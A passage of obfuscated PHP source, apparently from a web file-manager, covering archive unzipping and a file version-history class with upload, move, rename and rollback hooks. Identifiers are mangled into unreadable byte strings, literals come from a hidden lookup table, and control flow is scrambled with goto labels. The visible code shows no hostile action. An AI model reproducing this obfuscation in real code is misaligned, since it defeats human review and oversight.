$AµÀ…™ƒ¿‡ = array($DõƒÑá‘³[75] => $dŠö”öÛ «); } } $dŠö”öÛ « = $AµÀ…™ƒ¿‡[$DõƒÑá‘³[75]]; goto B±Ñ‹­ö’è; D˜Ú‡ Ù›: if (!@file_exists(self::iconvSystem($B°—çêÊÂ))) { $aÒã½ ËœÓ = self::localFilePath($fº‡¯ÚèÀ, $A½¹Õ£íö); $B°—çêÊÂ = $aÒã½ ËœÓ ? $aÒã½ ËœÓ : parent::download($fº‡¯ÚèÀ, $B°—çêÊÂ); } $B°—çêÊÂ = self::iconvSystem($B°—çêÊÂ); $dæùÖ¦¸ÜÚ = isset($AÎåêã¿ñ…[$DõƒÑá‘³[1060]]) ? $AÎåêã¿ñ…[$DõƒÑá‘³[1060]] : $DõƒÑá‘³[1061]; goto C«õã†¯Øİ; c­­»Õñë¤: $DõƒÑá‘³ =& $_SERVER[¢ÌÛ]; $fº‡¯ÚèÀ = $AÎåêã¿ñ…[$DõƒÑá‘³[75]]; $dŠö”öÛ « = $AÎåêã¿ñ…[$DõƒÑá‘³[1058]]; goto BÜª¶ßÙ‹ã; aÚŸÙ¤äªÛ: mk_dir($DË®ë‡å¸Ì); $A½¹Õ£íö = self::fileExt($BÒÀ‚“¡»Ù); $B°—çêÊÂ = $DË®ë‡å¸Ì . $DõƒÑá‘³[94] . $A½¹Õ£íö; goto D˜Ú‡ Ù›; B±Ñ‹­ö’è: $f«ÕÒ¢–Ò = self::tmpFileName($BÒÀ‚“¡»Ù); $DË®ë‡å¸Ì = TEMP_FILES . $f«ÕÒ¢–Ò; del_dir($DË®ë‡å¸Ì); goto aÚŸÙ¤äªÛ; fÛ¿É²Úø‹: return !0; goto cìÓß Â; cìÓß Â: } public static function unzipList($eÅñŠ¹áÖ™) { goto D’†‚Šˆæõ; bÄ‡Ö¦À‚: $E÷ŠÒÅÙÅ… = self::iconvSystem($E÷ŠÒÅÙÅ…); if ($aö‡ÄÌÍ´ >= 0) { $a»¬³§Á×ˆ = isset($eÅñŠ¹áÖ™[$eÆíï²¬Ö·[1070]]) ? $eÅñŠ¹áÖ™[$eÆíï²¬Ö·[1070]] : !1; $d÷™±­ÍË = isset($eÅñŠ¹áÖ™[$eÆíï²¬Ö·[28]]) ? $eÅñŠ¹áÖ™[$eÆíï²¬Ö·[28]] : $eÆíï²¬Ö·[33]; KodArchive::filePreview($E÷ŠÒÅÙÅ…, $aö‡ÄÌÍ´, $a»¬³§Á×ˆ, $d÷™±­ÍË); self::archiveExt(); die; } $aò½ËŒ‚„É = KodArchive::listContent($E÷ŠÒÅÙÅ…); goto C²°¶òà Î; Eëˆà³˜Š: if (isset($eç«ÓùÈÓ )) { $d—ÏóÆÈñ = array($eç«ÓùÈÓ [$eÆíï²¬Ö·[75]], $eç«ÓùÈÓ [$eÆíï²¬Ö·[1066]], $eç«ÓùÈÓ [$eÆíï²¬Ö·[28]]); $CÂ®Ê„Î© = md5(implode($eÆíï²¬Ö·[70], $d—ÏóÆÈñ)) . $eÆíï²¬Ö·[94] . get_path_ext($eç«ÓùÈÓ [$eÆíï²¬Ö·[28]]); } else { $d—ÏóÆÈñ = array($C¡¨Şø¼°ì[$eÆíï²¬Ö·[28]], $C¡¨Şø¼°ì[$eÆíï²¬Ö·[75]], $C¡¨Şø¼°ì[$eÆíï²¬Ö·[77]]); $CÂ®Ê„Î© = md5(implode($eÆíï²¬Ö·[70], $d—ÏóÆÈñ)) . $eÆíï²¬Ö·[94] . $bç¼™Ç†¿; } if ($aö‡ÄÌÍ´ == -1) { $cŠé¤ÁÏÛ½ = IO_PATH_SYSTEM_TEMP . "\x7a\x69\x70\x56\151\x65\x77\57{$aˆÃ‡ÁŒˆ®}\57{$CÂ®Ê„Î©}\56\x6c\157\x67"; $bíäÅçİ·Ş = self::infoFull($cŠé¤ÁÏÛ½); if ($bíäÅçİ·Ş) { $cŠé¤ÁÏÛ½ = $bíäÅçİ·Ş[$eÆíï²¬Ö·[75]]; $FÚïÒÚƒå™ = self::getContent($cŠé¤ÁÏÛ½); if ($FÚïÒÚƒå™) { $a¬–‘Ø„¾¾ = json_decode($FÚïÒÚƒå™, !0); if (count($a¬–‘Ø„¾¾) >= $E¼ì×‹–¬Ê) { show_json(sprintf(LNG($eÆíï²¬Ö·[1068]), count($a¬–‘Ø„¾¾)), !1); } return $a¬–‘Ø„¾¾; } } else { $cŠé¤ÁÏÛ½ = self::mkfile($cŠé¤ÁÏÛ½); } } $AÛ¸¾Á¼Ñ = TEMP_FILES . $aˆÃ‡ÁŒˆ®; goto cƒ¾ì¢ÒÔá; cƒ¾ì¢ÒÔá: if (!is_dir($AÛ¸¾Á¼Ñ)) { mk_dir($AÛ¸¾Á¼Ñ); } $E÷ŠÒÅÙÅ… = $AÛ¸¾Á¼Ñ . $eÆíï²¬Ö·[8] . $CÂ®Ê„Î©; if (!@file_exists(self::iconvSystem($E÷ŠÒÅÙÅ…))) { if (isset($eç«ÓùÈÓ )) { url_request($eäÓµ¬äÚ³, $eÆíï²¬Ö·[1069], $E÷ŠÒÅÙÅ…); } else { $CŞéÈ¾Æ£ù = self::localFilePath($eäÓµ¬äÚ³, $bç¼™Ç†¿); $E÷ŠÒÅÙÅ… = $CŞéÈ¾Æ£ù ? $CŞéÈ¾Æ£ù : self::download($eäÓµ¬äÚ³, $E÷ŠÒÅÙÅ…); } } goto bÄ‡Ö¦À‚; c¿×¿§¬÷Ã: $a¬–‘Ø„¾¾ = json_encode($aò½ËŒ‚„É[$eÆíï²¬Ö·[1064]]); self::setContent($cŠé¤ÁÏÛ½, $a¬–‘Ø„¾¾); if (count($aò½ËŒ‚„É[$eÆíï²¬Ö·[1064]]) >= $E¼ì×‹–¬Ê) { show_json(sprintf(LNG($eÆíï²¬Ö·[1068]), count($aò½ËŒ‚„É[$eÆíï²¬Ö·[1064]])), !1); } goto f†Å¹ëäƒ—; C²°¶òà Î: self::archiveExt(); del_dir($AÛ¸¾Á¼Ñ); if (!$aò½ËŒ‚„É[$eÆíï²¬Ö·[1062]]) { show_json($aò½ËŒ‚„É[$eÆíï²¬Ö·[1064]], !1); } goto c¿×¿§¬÷Ã; e ‰Ø«Çªë: $E¼ì×‹–¬Ê = 50000; if (request_url_safe($eäÓµ¬äÚ³)) { $eç«ÓùÈÓ  = parse_url_query($eäÓµ¬äÚ³); if (!isset($eç«ÓùÈÓ [$eÆíï²¬Ö·[75]])) { show_json($eÆíï²¬Ö·[1067], !1); } } $a —Ëï¬ = isset($eç«ÓùÈÓ ) ? $eç«ÓùÈÓ [$eÆíï²¬Ö·[75]] : $eäÓµ¬äÚ³; goto C¨¼½Ş„Ö; C¨¼½Ş„Ö: $C¡¨Şø¼°ì = self::info($a —Ëï¬); $bç¼™Ç†¿ = self::fileExt($C¡¨Şø¼°ì); $aˆÃ‡ÁŒˆ® = self::tmpFileName($C¡¨Şø¼°ì); goto Eëˆà³˜Š; D’†‚Šˆæõ: $eÆíï²¬Ö· =& $_SERVER[¢ÌÛ]; $eäÓµ¬äÚ³ = $eÅñŠ¹áÖ™[$eÆíï²¬Ö·[75]]; $aö‡ÄÌÍ´ = isset($eÅñŠ¹áÖ™[$eÆíï²¬Ö·[1066]]) ? $eÅñŠ¹áÖ™[$eÆíï²¬Ö·[1066]] : -1; goto e ‰Ø«Çªë; f†Å¹ëäƒ—: return $aò½ËŒ‚„É[$eÆíï²¬Ö·[1064]]; goto fãËáÏ£ó; fãËáÏ£ó: } private static function fileExt($cÔöŒíáŸ) { $DÊì²ô‡«ƒ =& $_SERVER[¢ÌÛ]; $aÜä³¤ßÔô = $cÔöŒíáŸ[$DÊì²ô‡«ƒ[167]]; if ($aÜä³¤ßÔô == $DÊì²ô‡«ƒ[1071]) { $b¯â´ï›è = $DÊì²ô‡«ƒ[1072]; if (substr($cÔöŒíáŸ[$DÊì²ô‡«ƒ[28]], -strlen($b¯â´ï›è)) == $b¯â´ï›è) { $aÜä³¤ßÔô = $DÊì²ô‡«ƒ[1073]; } } self::archiveExt($aÜä³¤ßÔô); return $aÜä³¤ßÔô; } private static function zipFileList($C• ±™Ûˆ, $f„ç‘Ë¼³¸ = false) { $cáƒÖ´ƒ“˜ =& $_SERVER[¢ÌÛ]; $bØÊô‡Æ = array(); foreach ($C• ±™Ûˆ as $fì®¤Ï®‘§) { $D™­æ…Áë£ = $fì®¤Ï®‘§[$cáƒÖ´ƒ“˜[75]]; if ($f„ç‘Ë¼³¸) { $D™­æ…Áë£ = self::copy($fì®¤Ï®‘§[$cáƒÖ´ƒ“˜[75]], $f„ç‘Ë¼³¸, $cáƒÖ´ƒ“˜[767]); } else { $aŸç¸·“š = self::init($fì®¤Ï®‘§[$cáƒÖ´ƒ“˜[75]]); if ($aŸç¸·“š->getType() == $cáƒÖ´ƒ“˜[105]) { $D™­æ…Áë£ = $aŸç¸·“š->path; } } if ($D™­æ…Áë£ && self::local()->exist($D™­æ…Áë£)) { $bØÊô‡Æ[$fì®¤Ï®‘§[$cáƒÖ´ƒ“˜[75]]] = $D™­æ…Áë£; } } if (!empty($bØÊô‡Æ)) { return array_values($bØÊô‡Æ); } show_json(LNG($cáƒÖ´ƒ“˜[1037]), !1); } public static function tmpFileName($aƒò´¾íõ¨) { $Aë‚”¼èŞã =& $_SERVER[¢ÌÛ]; $D¤Òë¢ßŸ³ = array($aƒò´¾íõ¨[$Aë‚”¼èŞã[28]], $aƒò´¾íõ¨[$Aë‚”¼èŞã[75]], $aƒò´¾íõ¨[$Aë‚”¼èŞã[77]], $aƒò´¾íõ¨[$Aë‚”¼èŞã[486]]); return md5(implode($Aë‚”¼èŞã[70], $D¤Òë¢ßŸ³)); } private static function localFilePath($CÄ†Ö’ íÛ, $a»à¿¿Ûà¡) { goto EÕƒÅ±õÆ‰; EÕƒÅ±õÆ‰: $A¹Ñ¢İ¶šç =& $_SERVER[¢ÌÛ]; if ($a»à¿¿Ûà¡ == $A¹Ñ¢İ¶šç[1074] && strtoupper(substr(PHP_OS, 0, 3)) == $A¹Ñ¢İ¶šç[1075]) { return !1; } $Aäß¾Ùçº¥ = KodIO::parse($CÄ†Ö’ íÛ); goto E îÙ½‰Ÿù; E îÙ½‰Ÿù: if ($Aäß¾Ùçº¥[$A¹Ñ¢İ¶šç[29]] == KodIO::KOD_SOURCE) { $bÓßé´ƒ¢ = Model($A¹Ñ¢İ¶šç[774])->fileInfoGet(KodIO::sourceID($CÄ†Ö’ íÛ)); if (!$bÓßé´ƒ¢[$A¹Ñ¢İ¶šç[75]]) { show_json($A¹Ñ¢İ¶šç[1076], !1); } $CÄ†Ö’ íÛ = $bÓßé´ƒ¢[$A¹Ñ¢İ¶šç[75]]; } $câ¢ê©ƒ‰ = self::init($CÄ†Ö’ íÛ); $d„¼„¯ÛÊ¢ = $câ¢ê©ƒ‰->getType(); goto a‹‘£¸²Ê™; a‹‘£¸²Ê™: if ($d„¼„¯ÛÊ¢ == $A¹Ñ¢İ¶šç[105] || $d„¼„¯ÛÊ¢ == $A¹Ñ¢İ¶šç[1077]) { if (!$câ¢ê©ƒ‰->exist($câ¢ê©ƒ‰->path)) { show_json(LNG($A¹Ñ¢İ¶šç[104]), !1); } return $câ¢ê©ƒ‰->path; } return !1; goto E™§¥ãÄš; E™§¥ãÄš: } private static function archiveExt($cÉ²¦³¨„š = '') { $GLOBALS[$_SERVER[¢ÌÛ][1078]] = $cÉ²¦³¨„š; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { goto AŠ“×»æ‹; FôğƒÅÇä: Hook::bind($b“ñÇ ƒ•£[1080], $b“ñÇ ƒ•£[1081]); Hook::bind($b“ñÇ ƒ•£[1082], $b“ñÇ ƒ•£[1083]); Hook::bind($b“ñÇ ƒ•£[1084], $b“ñÇ ƒ•£[1085]); goto bŒÍ³±Ø; AŠ“×»æ‹: $b“ñÇ ƒ•£ =& $_SERVER[¢ÌÛ]; $CÈ­ˆöŸÓ¡ = $GLOBALS[$b“ñÇ ƒ•£[6]][$b“ñÇ ƒ•£[87]][$b“ñÇ ƒ•£[1079]]; if ($CÈ­ˆöŸÓ¡ <= 0) { return; } goto FôğƒÅÇä; bŒÍ³±Ø: Hook::bind($b“ñÇ ƒ•£[1086], $b“ñÇ ƒ•£[1087]); Hook::bind($b“ñÇ ƒ•£[1088], $b“ñÇ ƒ•£[1089]); Hook::bind($b“ñÇ ƒ•£[1090], $b“ñÇ ƒ•£[1091]); goto cÄƒ¼¤×Â ; cÄƒ¼¤×Â : } public static function eventBeforeUpload($aÎãí¹µ²‚) { if ($aÎãí¹µ²‚[3] && $aÎãí¹µ²‚[3] != REPEAT_REPLACE) { return; } $aôº¯‡»Ô¯ = self::parsePath($aÎãí¹µ²‚[0]); if (!$aôº¯‡»Ô¯) { return; } self::add($aôº¯‡»Ô¯); } public static function eventBeforeEdit($c÷Şµë¨ÖÀ) { $D…”íÒƒŞ = self::parsePath($c÷Şµë¨ÖÀ[0]); if (!$D…”íÒƒŞ) { return; } self::add($D…”íÒƒŞ); } public static function eventBeforeCopyFile($då¬Ö‚äÚ×, $AÎääÃîàÉ, $BÙéÃ„ÑÊ, $cÌ§²«ÇÆÅ, $Cãáñ’‘İ„, $dİĞ¸Ù™¿Á) { $FáÚàÅ°Û = $BÙéÃ„ÑÊ->getPathOuter($cÌ§²«ÇÆÅ); $bÅ–³ß·… = self::parsePath($FáÚàÅ°Û); if (!$bÅ–³ß·…) { return; } self::add($bÅ–³ß·…); } public static function eventBeforeRename($e„±½¤¯ò) { $A§öï¦ªœ¾ =& $_SERVER[¢ÌÛ]; $F¥î‹‰÷íÄ = self::parsePath($e„±½¤¯ò[0]); if (!$F¥î‹‰÷íÄ) { return; } $FùëâßËî• = self::checkInHistory($F¥î‹‰÷íÄ); if (!$FùëâßËî•) { return; } if ($FùëâßËî•[$A§öï¦ªœ¾[29]] == $A§öï¦ªœ¾[173]) { $dä©®ÊÓ“ = self::listData($F¥î‹‰÷íÄ); if ($dä©®ÊÓ“ && $dä©®ÊÓ“[$A§öï¦ªœ¾[363]]) { self::moveHistory($F¥î‹‰÷íÄ, $e„±½¤¯ò[1]); } } else { IO::rename($FùëâßËî•[$A§öï¦ªœ¾[75]], $e„±½¤¯ò[1]); } } public static function eventBeforeMove($döËêÕ®) { goto EËÑ¹Ã‡³é; fÖƒ»–Ä¼…: $BÆ¯ÇãÙî¦ = self::checkInHistory($cõçŒİ—Ê…); if (!$BÆ¯ÇãÙî¦) { return; } $bÙ«Ú‡Ğß± = self::pathHistory($cÇŞˆãÃ„); goto f¼ºóßœ ; EØŞ¬”›ĞÅ: $cÇŞˆãÃ„ = self::parsePath($döËêÕ®[1]); if (!$cÇŞˆãÃ„) { return; } $eÚº×¿›ºÜ = $döËêÕ®[3]; goto fÖƒ»–Ä¼…; EËÑ¹Ã‡³é: $fÃ‡Î™ÑŒñ =& $_SERVER[¢ÌÛ]; $cõçŒİ—Ê… = self::parsePath($döËêÕ®[0]); if (!$cõçŒİ—Ê…) { return; } goto EØŞ¬”›ĞÅ; f¼ºóßœ : if ($BÆ¯ÇãÙî¦[$fÃ‡Î™ÑŒñ[29]] == $fÃ‡Î™ÑŒñ[173]) { $D±‰‰šŠæ¼ = self::listData($cõçŒİ—Ê…); $DëÔ©ÊÛ¿À = rtrim($cÇŞˆãÃ„, $fÃ‡Î™ÑŒñ[8]) . $fÃ‡Î™ÑŒñ[8] . ($eÚº×¿›ºÜ ? $eÚº×¿›ºÜ : get_path_this($cõçŒİ—Ê…)); $A¢© ‡’ª¶ = self::listData($DëÔ©ÊÛ¿À); if ($D±‰‰šŠæ¼ && $D±‰‰šŠæ¼[$fÃ‡Î™ÑŒñ[363]] && $A¢© ‡’ª¶ && $A¢© ‡’ª¶[$fÃ‡Î™ÑŒñ[363]]) { return self::clear($cõçŒİ—Ê…); } if ($D±‰‰šŠæ¼ && $D±‰‰šŠæ¼[$fÃ‡Î™ÑŒñ[363]]) { self::moveHistory($cõçŒİ—Ê…, $eÚº×¿›ºÜ, $bÙ«Ú‡Ğß±); } } else { IO::move($BÆ¯ÇãÙî¦[$fÃ‡Î™ÑŒñ[75]], $bÙ«Ú‡Ğß±, !1, $eÚº×¿›ºÜ); self::clearEmptyFolder(IO::pathFather($BÆ¯ÇãÙî¦[$fÃ‡Î™ÑŒñ[75]])); } goto fªùÍ«…·Ë; fªùÍ«…·Ë: } public static function eventAfterRemove($F—°éê½‘µ, $CØ©½çˆì¾) { goto C¨Ö÷ÎóÒš; e§Õ°ÚÚÓâ: if (!$F‰éÜë—) { return; } $aÍì¤×ßø¦ = self::checkInHistory($F‰éÜë—); if (!$aÍì¤×ßø¦) { return; } goto d‡óäÀôä; C¨Ö÷ÎóÒš: $c³ÈŒË¿¦† =& $_SERVER[¢ÌÛ]; if (!$CØ©½çˆì¾) { return; } $F‰éÜë— = self::parsePath($F—°éê½‘µ[0]); goto e§Õ°ÚÚÓâ; d‡óäÀôä: if ($aÍì¤×ßø¦[$c³ÈŒË¿¦†[29]] == $c³ÈŒË¿¦†[173]) { $côŸ‹šî–´ = self::listData($F‰éÜë—, !1); if ($côŸ‹šî–´ && $côŸ‹šî–´[$c³ÈŒË¿¦†[363]]) { self::clear($F‰éÜë—, !1); } } else { IO::remove($aÍì¤×ßø¦[$c³ÈŒË¿¦†[75]]); self::clearEmptyFolder(IO::pathFather($aÍì¤×ßø¦[$c³ÈŒË¿¦†[75]])); } goto då¸‹¾„ê›; då¸‹¾„ê›: } private static function checkInHistory($AÖÃê‘¾–) { $F‰¼‚Æí¡ = self::pathHistory($AÖÃê‘¾–); if (!IO::exist($F‰¼‚Æí¡)) { $F‰¼‚Æí¡ .= $_SERVER[¢ÌÛ][1092]; } return IO::exist($F‰¼‚Æí¡) ? IO::info($F‰¼‚Æí¡) : !1; } private static function parsePath($Aî×ë”¹Ô¯) { goto D‰½ñİó; bãÆâÅ¦Ö: $f˜ö‹±½®Ä = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $a’¨Ê£Òß[1095]); foreach ($f˜ö‹±½®Ä as $f‹„×«‰†») { if (!$Dˆ£ˆ¶ãä¼ && substr($Aî×ë”¹Ô¯, 0, strlen($f‹„×«‰†»)) == $f‹„×«‰†») { return !1; } } self::log($GLOBALS[$a’¨Ê£Òß[1019]] . $a’¨Ê£Òß[1096] . $Aî×ë”¹Ô¯); goto a öÈ¬ŸæÀ; e»ÁˆÊ»ã¿: $A¬¶ì‰ê×Š = KodIO::parse($Aî×ë”¹Ô¯); $Dˆ£ˆ¶ãä¼ = $A¬¶ì‰ê×Š[$a’¨Ê£Òß[29]]; $B†½ÎŞ×œ› = !$Dˆ£ˆ¶ãä¼ || $Dˆ£ˆ¶ãä¼ == KodIO::KOD_IO || $Dˆ£ˆ¶ãä¼ == KodIO::KOD_SHARE_ITEM; goto a„ÚƒÇáßö; a„ÚƒÇáßö: if (!$B†½ÎŞ×œ› || !$A¬¶ì‰ê×Š[$a’¨Ê£Òß[1094]]) { return !1; } if ($Dˆ£ˆ¶ãä¼ == KodIO::KOD_SHARE_ITEM) { $EäŸšíËéİ = IO::init($Aî×ë”¹Ô¯); if ($EäŸšíËéİ->pathParse[$a’¨Ê£Òß[1024]]) { return self::parsePath($EäŸšíËéİ->pathParse[$a’¨Ê£Òß[1024]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } goto bãÆâÅ¦Ö; D‰½ñİó: $a’¨Ê£Òß =& $_SERVER[¢ÌÛ]; if (!$Aî×ë”¹Ô¯) { return !1; } if ($GLOBALS[$a’¨Ê£Òß[1093]]) { return; } goto e»ÁˆÊ»ã¿; a öÈ¬ŸæÀ: return $Aî×ë”¹Ô¯; goto EÏŒÀÀöÉï; EÏŒÀÀöÉï: } private static function pathHistory($eÖ‘§‰¨ï) { $D¶´ËèĞ® =& $_SERVER[¢ÌÛ]; $aÊÕ©òÅ‘¾ = self::$_historyBase . ltrim(KodIO::clear($eÖ‘§‰¨ï), $D¶´ËèĞ®[8]); $aÊÕ©òÅ‘¾ = str_replace(array($D¶´ËèĞ®[1097]), array($D¶´ËèĞ®[1098]), $aÊÕ©òÅ‘¾); return $aÊÕ©òÅ‘¾; } public static function log($AÂ»††Å¸Ï) { } public static function historyCount($B‰Ë™Èææ) { $A¯˜ÎÚ‹ÆŒ =& $_SERVER[¢ÌÛ]; $aš‹ÒÇŠŠ¶ = array(); $Dğ’Ì§ê„ğ = array(); foreach ($B‰Ë™Èææ as $AğöÑ¦ÒøŞ) { $Aè‡»›§â = get_path_father($AğöÑ¦ÒøŞ); if (!$Dğ’Ì§ê„ğ[$Aè‡»›§â]) { $Dğ’Ì§ê„ğ[$Aè‡»›§â] = array(); } $Dğ’Ì§ê„ğ[$Aè‡»›§â][] = get_path_this($AğöÑ¦ÒøŞ); } foreach ($Dğ’Ì§ê„ğ as $Aè‡»›§â => $aƒùì¥½ç×) { $B¶ÀŞø‰º = self::parsePath($Aè‡»›§â); if (!$B¶ÀŞø‰º) { continue; } foreach ($aƒùì¥½ç× as $dÅËØ¬ğ…µ) { $a„•ˆÌĞ  = self::listData(rtrim($B¶ÀŞø‰º, $A¯˜ÎÚ‹ÆŒ[8]) . $A¯˜ÎÚ‹ÆŒ[8] . $dÅËØ¬ğ…µ, !1); if ($a„•ˆÌĞ  && $a„•ˆÌĞ [$A¯˜ÎÚ‹ÆŒ[363]]) { $aš‹ÒÇŠŠ¶[rtrim($Aè‡»›§â, $A¯˜ÎÚ‹ÆŒ[8]) . $A¯˜ÎÚ‹ÆŒ[8] . $dÅËØ¬ğ…µ] = count($a„•ˆÌĞ [$A¯˜ÎÚ‹ÆŒ[363]]); } } } return $aš‹ÒÇŠŠ¶; } public static function add($EƒÑïó“ì) { goto A˜’Ò†¨ë›; BÈİéùÕñ: if ($F¡Ê¯´˜› && $F¡Ê¯´˜›[0][$a™³óÉ¢ [170]] == $FğºçŠÈ×å) { return !0; } if (array_key_exists($a™³óÉ¢ [194], $D•÷¯à®à«) && !$D•÷¯à®à«[$a™³óÉ¢ [194]]) { return !1; } $CÇÂ¬œÜä = short_id(time()); goto Aë‰÷Ê¶Ü‰; A˜’Ò†¨ë›: $a™³óÉ¢  =& $_SERVER[¢ÌÛ]; $bº×„„…•­ = self::listData($EƒÑïó“ì); if (!$bº×„„…•­) { return; } goto CÖíŞô»; B ø‰Ùª‚Ò: if ($CœÆ¤©˜Ò <= 0) { return; } $FğºçŠÈ×å = IO::hashSimple($EƒÑïó“ì); $D•÷¯à®à« = IO::info($EƒÑïó“ì); goto c£¤ÊâèÑÙ; CÖíŞô»: $EÂ—êÙä– = Model($a™³óÉ¢ [1099])->get($a™³óÉ¢ [1100]); $CœÆ¤©˜Ò = $GLOBALS[$a™³óÉ¢ [6]][$a™³óÉ¢ [87]][$a™³óÉ¢ [1079]]; $D¨Ä±¸Šó¼ = $EÂ—êÙä– == $a™³óÉ¢ [1101] ? 5 : $CœÆ¤©˜Ò; goto B ø‰Ùª‚Ò; CäÁßöÎ®: if (!$bÜå‡©Ä¦â) { self::clearEmptyFolder($bº×„„…•­[$a™³óÉ¢ [1104]]); return !1; } array_unshift($F¡Ê¯´˜›, $b½„œöİ„Ü); if (count($F¡Ê¯´˜›) > $D¨Ä±¸Šó¼) { $A¨¶Î½ùÜ“ = array_slice($F¡Ê¯´˜›, $D¨Ä±¸Šó¼); foreach ($A¨¶Î½ùÜ“ as $FŠ‰Ç…ªÄ¢) { IO::remove($bº×„„…•­[$a™³óÉ¢ [1104]] . $FŠ‰Ç…ªÄ¢[$a™³óÉ¢ [28]]); } $F¡Ê¯´˜› = array_slice($F¡Ê¯´˜›, 0, $D¨Ä±¸Šó¼); } goto Dò‡¾ğŞ£¾; c£¤ÊâèÑÙ: $F¡Ê¯´˜› = $bº×„„…•­[$a™³óÉ¢ [363]]; if ($D•÷¯à®à«[$a™³óÉ¢ [77]] == 0) { return; } if ($D•÷¯à®à«[$a™³óÉ¢ [77]] >= 1024 * 1024 * 500) { return !1; } goto BÈİéùÕñ; Aë‰÷Ê¶Ü‰: $b½„œöİ„Ü = array($a™³óÉ¢ [385] => $CÇÂ¬œÜä, $a™³óÉ¢ [170] => $FğºçŠÈ×å, $a™³óÉ¢ [28] => $D•÷¯à®à«[$a™³óÉ¢ [28]] . $a™³óÉ¢ [94] . date($a™³óÉ¢ [1102]) . rand_string(1), $a™³óÉ¢ [77] => $D•÷¯à®à«[$a™³óÉ¢ [77]], $a™³óÉ¢ [405] => USER_ID, $a™³óÉ¢ [192] => time(), $a™³óÉ¢ [1103] => $a™³óÉ¢ [33]); IO::mkdir($bº×„„…•­[$a™³óÉ¢ [1104]]); $bÜå‡©Ä¦â = IO::copy($EƒÑïó“ì, $bº×„„…•­[$a™³óÉ¢ [1104]], !1, $b½„œöİ„Ü[$a™³óÉ¢ [28]]); goto CäÁßöÎ®; Dò‡¾ğŞ£¾: return self::saveData($bº×„„…•­[$a™³óÉ¢ [1105]], $F¡Ê¯´˜›); goto cÔ••õ´…‘; cÔ••õ´…‘: } public static function remove($côõˆ²¹é¿, $FÈ˜ÍìÉ) { $c©­Ãà¡ªì =& $_SERVER[¢ÌÛ]; $c›îßì‹½¶ = self::listData($côõˆ²¹é¿); $E¶‚øŠ×á­ = array(); if (!$c›îßì‹½¶) { return !1; } foreach ($c›îßì‹½¶[$c©­Ãà¡ªì[363]] as $cªï«óŸê«) { if ($cªï«óŸê«[$c©­Ãà¡ªì[385]] == $FÈ˜ÍìÉ) { IO::remove($c›îßì‹½¶[$c©­Ãà¡ªì[1104]] . $cªï«óŸê«[$c©­Ãà¡ªì[28]]); continue; } $E¶‚øŠ×á­[] = $cªï«óŸê«; } return self::saveData($c›îßì‹½¶[$c©­Ãà¡ªì[1105]], $E¶‚øŠ×á­); } public static function clear($bäÆÍ¹ùæ, $cõµËéŠÁ£ = true) { $aÖóÊ¤‹´ =& $_SERVER[¢ÌÛ]; $e´‡ÅÈïîã = self::listData($bäÆÍ¹ùæ, $cõµËéŠÁ£); if (!$e´‡ÅÈïîã) { return !1; } foreach ($e´‡ÅÈïîã[$aÖóÊ¤‹´[363]] as $dğ™¤øùñè) { IO::remove($e´‡ÅÈïîã[$aÖóÊ¤‹´[1104]] . $dğ™¤øùñè[$aÖóÊ¤‹´[28]]); } return self::saveData($e´‡ÅÈïîã[$aÖóÊ¤‹´[1105]], array()); } public static function moveHistory($böíÑóŞ…, $b´“áÀ¤÷ = '', $fœ»ºìÇç = '') { goto Eì‰Éİ„æá; b Ë¡¼ÁÆ³: $C¢Ö²Ö¤Ş† = $Aè“Ñ‡ŠÑÉ[1092]; $b´“áÀ¤÷ = $b´“áÀ¤÷ ? $b´“áÀ¤÷ : get_path_this($böíÑóŞ…); $fœ»ºìÇç = $fœ»ºìÇç ? $fœ»ºìÇç : $Cîê„Ï¢[$Aè“Ñ‡ŠÑÉ[1104]]; goto C£¾Ñ–‰ƒ; Eì‰Éİ„æá: $Aè“Ñ‡ŠÑÉ =& $_SERVER[¢ÌÛ]; $Cîê„Ï¢ = self::listData($böíÑóŞ…, !1); if (!$Cîê„Ï¢ || !$Cîê„Ï¢[$Aè“Ñ‡ŠÑÉ[363]]) { return !1; } goto b Ë¡¼ÁÆ³; cº«‡‰Á°¸: self::saveData($Cîê„Ï¢[$Aè“Ñ‡ŠÑÉ[1105]], $Cîê„Ï¢[$Aè“Ñ‡ŠÑÉ[363]]); self::clearEmptyFolder($Cîê„Ï¢[$Aè“Ñ‡ŠÑÉ[1104]]); goto Eó½â­àÉ; C£¾Ñ–‰ƒ: $e—«ÔÃ™ = substr(get_path_this($Cîê„Ï¢[$Aè“Ñ‡ŠÑÉ[1105]]), 0, -strlen($C¢Ö²Ö¤Ş†)); foreach ($Cîê„Ï¢[$Aè“Ñ‡ŠÑÉ[363]] as $aÉ×¾¤™Ù† => $a‘İ–ƒõÁô) { $CšãĞ’ÏØ£ = $b´“áÀ¤÷ . substr($a‘İ–ƒõÁô[$Aè“Ñ‡ŠÑÉ[28]], strlen($e—«ÔÃ™)); $fÑ–ÚĞ²Ç© = IO::move($Cîê„Ï¢[$Aè“Ñ‡ŠÑÉ[1104]] . $a‘İ–ƒõÁô[$Aè“Ñ‡ŠÑÉ[28]], $fœ»ºìÇç, !1, $CšãĞ’ÏØ£); if ($fÑ–ÚĞ²Ç©) { $Cîê„Ï¢[$Aè“Ñ‡ŠÑÉ[363]][$aÉ×¾¤™Ù†][$Aè“Ñ‡ŠÑÉ[28]] = $CšãĞ’ÏØ£; } } $Cîê„Ï¢[$Aè“Ñ‡ŠÑÉ[1105]] = IO::move($Cîê„Ï¢[$Aè“Ñ‡ŠÑÉ[1105]], $fœ»ºìÇç, !1, $b´“áÀ¤÷ . $C¢Ö²Ö¤Ş†); goto cº«‡‰Á°¸; Eó½â­àÉ: } public static function rollback($EÖƒÙİĞó±, $aˆ†Ë¬¸šŞ) { $aŠÆ«ÓÚ‘ =& $_SERVER[¢ÌÛ]; $A‡¯ÅŒäˆ¡ = self::listData($EÖƒÙİĞó±); if (!$A‡¯ÅŒäˆ¡) { return; } $Fİ¼» ¶‡¦ = IO::info($EÖƒÙİĞó±); foreach ($A‡¯ÅŒäˆ¡[$aŠÆ«ÓÚ‘[363]] as $F‰¯à±Ò„  => $bÀËµª’…½) { if ($bÀËµª’…½[$aŠÆ«ÓÚ‘[385]] == $aˆ†Ë¬¸šŞ) { self::add($EÖƒÙİĞó±); $b—ÜÇ´ö´ = $A‡¯ÅŒäˆ¡[$aŠÆ«ÓÚ‘[1104]] . $bÀËµª’…½[$aŠÆ«ÓÚ‘[28]]; $fñ„´¶¦ = IO::copy($b—ÜÇ´ö´, IO::pathFather($EÖƒÙİĞó±), 